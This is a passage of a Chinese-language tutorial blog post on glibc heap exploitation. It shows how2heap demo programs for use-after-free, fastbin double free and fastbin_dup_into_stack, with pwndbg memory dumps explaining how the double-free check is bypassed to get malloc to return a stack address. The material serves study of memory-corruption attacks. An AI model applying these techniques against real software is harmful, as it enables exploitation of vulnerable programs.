class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">Pwndbg&gt; x/20a 0x602000</span><br><span class="line">0x602000:0x00x211</span><br><span class="line">0x602010:0x20736920736968740x7ffff7002143</span><br><span class="line">0x602020:0x00x0</span><br><span class="line">0x602030:0x00x0</span><br><span class="line">0x602040:0x00x0</span><br><span class="line">0x602050:0x00x0</span><br><span class="line">0x602060:0x00x0</span><br><span class="line">0x602070:0x00x0</span><br><span class="line">0x602080:0x00x0</span><br><span class="line">0x602090:0x00x0</span><br><span class="line">Pwndbg&gt; x/5s 0x602010</span><br><span class="line">0x602010:<span class="string">&quot;this is C!&quot;</span></span><br><span class="line">0x60201b:<span class="string">&quot;\367\377\177&quot;</span></span><br><span class="line">0x60201f:<span class="string">&quot;&quot;</span></span><br><span class="line">0x602020:<span class="string">&quot;&quot;</span></span><br><span class="line">0x602021:<span class="string">&quot;&quot;</span></span><br><span class="line">Pwndbg&gt;</span><br></pre></td></tr></table></figure><p>Unsortedbin 也被取出。</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/20180814164027.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/20180814164027.png"></a></p><p>我们发现在原来 chunk A 的位置 也是chunk C 的位置。为什么用“也”呢？因为如果去打印 chunk A 的指针我们也会打印出 “This is C” 的字符串。    </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">Pwndbg&gt; p &amp;a</span><br><span class="line"><span class="variable">$3</span> = (char **) 0x7fffffffe408</span><br><span class="line">Pwndbg&gt; x/20a 0x7fffffffe408</span><br><span class="line">0x7fffffffe408:0x6020100x602220</span><br><span class="line">0x7fffffffe418:0x6020100x4008e0 &lt;__libc_csu_init&gt;</span><br><span class="line">0x7fffffffe428:0x7ffff7a303f1 &lt;__libc_start_main+241&gt;0x40000</span><br><span class="line">0x7fffffffe438:0x7fffffffe5080x1f7b9a488</span><br><span class="line">0x7fffffffe448:0x400616 &lt;main&gt;0x0</span><br><span class="line">0x7fffffffe458:0x873c9590c5edf93b0x400520 &lt;_start&gt;</span><br><span class="line">0x7fffffffe468:0x7fffffffe5000x0</span><br><span class="line">0x7fffffffe478:0x00x78c36aef1c4df93b</span><br><span class="line">0x7fffffffe488:0x78c37a56d37ff93b0x0</span><br><span class="line">0x7fffffffe498:0x00x0</span><br><span class="line">Pwndbg&gt; x/20a 0x602010</span><br><span class="line">0x602010:0x20736920736968740x7ffff7002143</span><br><span class="line">0x602020:0x00x0</span><br><span class="line">0x602030:0x00x0</span><br><span class="line">0x602040:0x00x0</span><br><span class="line">0x602050:0x00x0</span><br><span class="line">0x602060:0x00x0</span><br><span class="line">0x602070:0x00x0</span><br><span class="line">0x602080:0x00x0</span><br><span class="line">0x602090:0x00x0</span><br><span class="line">0x6020a0:0x00x0</span><br><span class="line">Pwndbg&gt; p a</span><br><span class="line"><span class="variable">$4</span> = 0x602010 <span class="string">&quot;this is C!&quot;</span></span><br><span class="line">Pwndbg&gt;</span><br></pre></td></tr></table></figure><p>从这我们就会发现 我们去打印 a的内容，a的内容也是‘this is C’。这个就是一个很明显的 <strong>use-after-free</strong> 漏洞。</p><hr><p>uaf 造成原因：</p><pre><code>指针free 掉后并没有置0</code></pre><hr><h3 id="0x2-fastbin-dup"><a href="#0x2-fastbin-dup" class="headerlink" title="0x2 fastbin_dup"></a>0x2 fastbin_dup</h3><p>Tricking malloc into returning an already-allocated heap pointer by abusing the fastbin freelist. </p><p>fastbin 机制下的 double free。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This file demonstrates a simple double-free attack with fastbins.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Allocating 3 buffers.\n&quot;</span>);</span><br><span class="line"><span class="keyword">int</span> *a = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line"><span class="keyword">int</span> *b = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line"><span class="keyword">int</span> *c = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;1st malloc(8): %p\n&quot;</span>, a);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;2nd malloc(8): %p\n&quot;</span>, b);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;3rd malloc(8): %p\n&quot;</span>, c);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Freeing the first one...\n&quot;</span>);</span><br><span class="line"><span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;If we free %p again, things will crash because %p is at the top of the free list.\n&quot;</span>, a, a);</span><br><span class="line"><span class="comment">// free(a);</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;So, instead, we&#x27;ll free %p.\n&quot;</span>, b);</span><br><span class="line"><span class="built_in">free</span>(b);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now, we can free %p again, since it&#x27;s not the head of the free list.\n&quot;</span>, a);</span><br><span class="line"><span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now the free list has [ %p, %p, %p ]. If we malloc 3 times, we&#x27;ll get %p twice!\n&quot;</span>, a, b, a, a);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;1st malloc(8): %p\n&quot;</span>, <span class="built_in">malloc</span>(<span class="number">8</span>));</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;2nd malloc(8): %p\n&quot;</span>, <span class="built_in">malloc</span>(<span class="number">8</span>));</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;3rd malloc(8): %p\n&quot;</span>, <span class="built_in">malloc</span>(<span class="number">8</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在这之前，我们先看一个程序。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">17</span>     <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Freeing the first one...\n&quot;</span>);</span><br><span class="line"><span class="number">18</span>     <span class="built_in">free</span>(a);</span><br><span class="line"><span class="number">19</span></span><br><span class="line"><span class="number">20</span>     <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;If we free %p again, things will crash because %p is at the top of the free list.\n&quot;</span>, a, a);</span><br><span class="line"><span class="number">21</span>     <span class="built_in">free</span>(a);</span><br><span class="line"><span class="number">22</span></span><br><span class="line"><span class="number">23</span>     <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;So, instead, we&#x27;ll free %p.\n&quot;</span>, b);</span><br><span class="line"><span class="number">24</span>     <span class="built_in">free</span>(b);</span><br><span class="line"><span class="number">25</span></span><br></pre></td></tr></table></figure><p>我们把21 行的注释去掉。编译程序并运行。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">This file demonstrates a simple double-free attack with fastbins.</span><br><span class="line">Allocating 3 buffers.</span><br><span class="line">1st malloc(8): 0xb74010</span><br><span class="line">2nd malloc(8): 0xb74030</span><br><span class="line">3rd malloc(8): 0xb74050</span><br><span class="line">Freeing the first one...</span><br><span class="line">If we free 0xb74010 again, things will crash because 0xb74010 is at the top of the free list.</span><br><span class="line">*** Error <span class="keyword">in</span> `./fastbin_dup_double_free<span class="string">&#x27;: double free or corruption (fasttop): 0x0000000000b74010 ***</span></span><br><span class="line"><span class="string">======= Backtrace: =========</span></span><br><span class="line"><span class="string">/lib/x86_64-linux-gnu/libc.so.6(+0x790cb)[0x7fe7c6e7d0cb]</span></span><br><span class="line"><span class="string">/lib/x86_64-linux-gnu/libc.so.6(+0x82c9a)[0x7fe7c6e86c9a]</span></span><br><span class="line"><span class="string">/lib/x86_64-linux-gnu/libc.so.6(cfree+0x4c)[0x7fe7c6e8ad8c]</span></span><br><span class="line"><span class="string">./fastbin_dup_double_free[0x400740]</span></span><br><span class="line"><span class="string">/lib/x86_64-linux-gnu/libc.so.6(__libc_start_main+0xf1)[0x7fe7c6e243f1]</span></span><br><span class="line"><span class="string">./fastbin_dup_double_free[0x40054a]</span></span><br><span class="line"><span class="string">======= Memory map: ========</span></span><br></pre></td></tr></table></figure><p>当我们运行程序后，程序发生了明显的报错，这是一个典型的 **double free **。意味通常而言，一个已经 free 掉的 chunk 是不能被 free 第二次的。然后我们把原本的注释加上。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">17</span>     <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Freeing the first one...\n&quot;</span>);</span><br><span class="line"><span class="number">18</span>     <span class="built_in">free</span>(a);</span><br><span class="line"><span class="number">19</span></span><br><span class="line"><span class="number">20</span>     <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;If we free %p again, things will crash because %p is at the top of the free list.\n&quot;</span>, a, a);</span><br><span class="line"><span class="number">21</span>     <span class="comment">//free(a);</span></span><br><span class="line"><span class="number">22</span></span><br><span class="line"><span class="number">23</span>     <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;So, instead, we&#x27;ll free %p.\n&quot;</span>, b);</span><br><span class="line"><span class="number">24</span>     <span class="built_in">free</span>(b);</span><br></pre></td></tr></table></figure><p>然后重新编译。<code>gcc -g -no-pie fastbin_dup.c -o fastbin_dup</code>  并上调试器。</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/20180814165413.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/20180814165413.png"></a></p><p>首先程序 malloc 了三个 chunk 。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">Pwndbg&gt; heap</span><br><span class="line">Top Chunk: 0x602060</span><br><span class="line">Last Remainder: 0</span><br><span class="line"></span><br><span class="line">0x602000 FASTBIN &#123;</span><br><span class="line">  prev_size = 0x0,</span><br><span class="line">  size = 0x21,</span><br><span class="line">  fd = 0x0,</span><br><span class="line">  bk = 0x0,</span><br><span class="line">  fd_nextsize = 0x0,</span><br><span class="line">  bk_nextsize = 0x21</span><br><span class="line">&#125;</span><br><span class="line">0x602020 FASTBIN &#123;</span><br><span class="line">  prev_size = 0x0,</span><br><span class="line">  size = 0x21,</span><br><span class="line">  fd = 0x0,</span><br><span class="line">  bk = 0x0,</span><br><span class="line">  fd_nextsize = 0x0,</span><br><span class="line">  bk_nextsize = 0x21</span><br><span class="line">&#125;</span><br><span class="line">0x602040 FASTBIN &#123;</span><br><span class="line">  prev_size = 0x0,</span><br><span class="line">  size = 0x21,</span><br><span class="line">  fd = 0x0,</span><br><span class="line">  bk = 0x0,</span><br><span class="line">  fd_nextsize = 0x0,</span><br><span class="line">  bk_nextsize = 0x20fa1</span><br><span class="line">&#125;</span><br><span class="line">0x602060 PREV_INUSE &#123;</span><br><span class="line">  prev_size = 0x0,</span><br><span class="line">  size = 0x20fa1,</span><br><span class="line">  fd = 0x0,</span><br><span class="line">  bk = 0x0,</span><br><span class="line">  fd_nextsize = 0x0,</span><br><span class="line">  bk_nextsize = 0x0</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后 free(a)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">  <span class="number">15</span> <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;3rd malloc(8): %p\n&quot;</span>, c);</span><br><span class="line">  <span class="number">16</span></span><br><span class="line">  <span class="number">17</span> <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Freeing the first one...\n&quot;</span>);</span><br><span class="line">► <span class="number">18</span> <span class="built_in">free</span>(a);</span><br><span class="line">  <span class="number">19</span></span><br><span class="line">  <span class="number">20</span> <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;If we free %p again, things will crash because %p is at the top of the free list.\n&quot;</span>, a, a);</span><br><span class="line">  <span class="number">21</span> <span class="comment">//free(a);</span></span><br></pre></td></tr></table></figure><p>free(b)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">  <span class="number">22</span></span><br><span class="line">  <span class="number">23</span> <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;So, instead, we&#x27;ll free %p.\n&quot;</span>, b);</span><br><span class="line">  <span class="number">24</span> <span class="built_in">free</span>(b);</span><br><span class="line">  <span class="number">25</span></span><br><span class="line">► <span class="number">26</span> <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now, we can free %p again, since it&#x27;s not the head of the free list.\n&quot;</span>, a);</span><br><span class="line">  <span class="number">27</span> <span class="built_in">free</span>(a);</span><br></pre></td></tr></table></figure><p>这个时候，fastbin 形成一个 fastbin freelist</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Pwndbg&gt; fastbins</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x602020 —▸ 0x602000 ◂— 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br></pre></td></tr></table></figure><p>chunk A  —&gt; chunk B</p><p>然后我们再把 a free 一次</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">  <span class="number">22</span></span><br><span class="line">  <span class="number">23</span> <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;So, instead, we&#x27;ll free %p.\n&quot;</span>, b);</span><br><span class="line">  <span class="number">24</span> <span class="built_in">free</span>(b);</span><br><span class="line">  <span class="number">25</span></span><br><span class="line">  <span class="number">26</span> <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now, we can free %p again, since it&#x27;s not the head of the free list.\n&quot;</span>, a);</span><br><span class="line">► <span class="number">27</span> <span class="built_in">free</span>(a);</span><br><span class="line">  <span class="number">28</span></span><br><span class="line">  <span class="number">29</span> <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now the free list has [ %p, %p, %p ]. If we malloc 3 times, we&#x27;ll get %p twice!\n&quot;</span>, a, b, a, a);</span><br><span class="line">  <span class="number">30</span> <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;1st malloc(8): %p\n&quot;</span>, <span class="built_in">malloc</span>(<span class="number">8</span>));</span><br><span class="line">  <span class="number">31</span> <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;2nd malloc(8): %p\n&quot;</span>, <span class="built_in">malloc</span>(<span class="number">8</span>));</span><br><span class="line">  <span class="number">32</span> <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;3rd malloc(8): %p\n&quot;</span>, <span class="built_in">malloc</span>(<span class="number">8</span>));</span><br></pre></td></tr></table></figure><p>我们发现这次并没有发生报错。形成了如下的 free list。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Pwndbg&gt; fastbins</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x602000 —▸ 0x602020 ◂— 0x602000</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br></pre></td></tr></table></figure><p>—————     —————      ————— </p><p>|Chunk A| -&gt; |chunk B| –&gt;| chunk A|</p><p>—————     —————      ————— </p><pre><code>                              /\                          |                              |  ------------- -------</code></pre><p>大概如上个图，这样我们就成功绕过了 fastbins 的double free检查。原因如下：</p><p>fastbins 可以看成一个 LIFO 的栈，使用单链表实现，通过 fastbin-&gt;fd 来遍历 fastbins。由于 free 的过程会对 free list 做检查，我们不能连续两次 free 同一个 chunk，所以这里在两次 free 之间，增加了一次对其他 chunk 的 free 过程，从而绕过检查顺利执行。然后再 malloc 三次，就在同一个地址 malloc 了两次，也就有了两个指向同一块内存区域的指针。</p><h3 id="0x3-fastbin-dup-into-stack"><a href="#0x3-fastbin-dup-into-stack" class="headerlink" title="0x3 fastbin_dup_into_stack"></a>0x3 fastbin_dup_into_stack</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This file extends on fastbin_dup.c by tricking malloc into\n&quot;</span></span><br><span class="line">       <span class="string">&quot;returning a pointer to a controlled location (in this case, the stack).\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> stack_var;</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;The address we want malloc() to return is %p.\n&quot;</span>, <span class="number">8</span>+(<span class="keyword">char</span> *)&amp;stack_var);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Allocating 3 buffers.\n&quot;</span>);</span><br><span class="line"><span class="keyword">int</span> *a = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line"><span class="keyword">int</span> *b = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line"><span class="keyword">int</span> *c = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;1st malloc(8): %p\n&quot;</span>, a);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;2nd malloc(8): %p\n&quot;</span>, b);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;3rd malloc(8): %p\n&quot;</span>, c);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Freeing the first one...\n&quot;</span>);</span><br><span class="line"><span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;If we free %p again, things will crash because %p is at the top of the free list.\n&quot;</span>, a, a);</span><br><span class="line"><span class="comment">// free(a);</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;So, instead, we&#x27;ll free %p.\n&quot;</span>, b);</span><br><span class="line"><span class="built_in">free</span>(b);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now, we can free %p again, since it&#x27;s not the head of the free list.\n&quot;</span>, a);</span><br><span class="line"><span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now the free list has [ %p, %p, %p ]. &quot;</span></span><br><span class="line"><span class="string">&quot;We&#x27;ll now carry out our attack by modifying data at %p.\n&quot;</span>, a, b, a, a);</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *d = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;1st malloc(8): %p\n&quot;</span>, d);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;2nd malloc(8): %p\n&quot;</span>, <span class="built_in">malloc</span>(<span class="number">8</span>));</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now the free list has [ %p ].\n&quot;</span>, a);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now, we have access to %p while it remains at the head of the free list.\n&quot;</span></span><br><span class="line"><span class="string">&quot;so now we are writing a fake free size (in this case, 0x20) to the stack,\n&quot;</span></span><br><span class="line"><span class="string">&quot;so that malloc will think there is a free chunk there and agree to\n&quot;</span></span><br><span class="line"><span class="string">&quot;return a pointer to it.\n&quot;</span>, a);</span><br><span class="line">stack_var = <span class="number">0x20</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now, we overwrite the first 8 bytes of the data at %p to point right before the 0x20.\n&quot;</span>, a);</span><br><span class="line">*d = (<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span>) (((<span class="keyword">char</span>*)&amp;stack_var) - <span class="keyword">sizeof</span>(d));</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;3rd malloc(8): %p, putting the stack address on the free list\n&quot;</span>, <span class="built_in">malloc</span>(<span class="number">8</span>));</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;4th malloc(8): %p\n&quot;</span>, <span class="built_in">malloc</span>(<span class="number">8</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>通用的，编译后我们 gdb 挂载程序。</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/20180814172825.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/20180814172825.png"></a></p><p>程序通用 malloc 了三个 chunk,紧接着通过 fastbin double free 的操作形成了如下freelist。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Pwndbg&gt; fastbins</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x603000 —▸ 0x603020 ◂— 0x603000</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br></pre></td></tr></table></figure><p>然后呢 我再malloc chunk d</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">  <span class="number">36</span> <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *d = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line">  <span class="number">37</span></span><br><span class="line">  <span class="number">38</span> <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;1st malloc(8): %p\n&quot;</span>, d);</span><br><span class="line">  <span class="number">39</span> <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;2nd 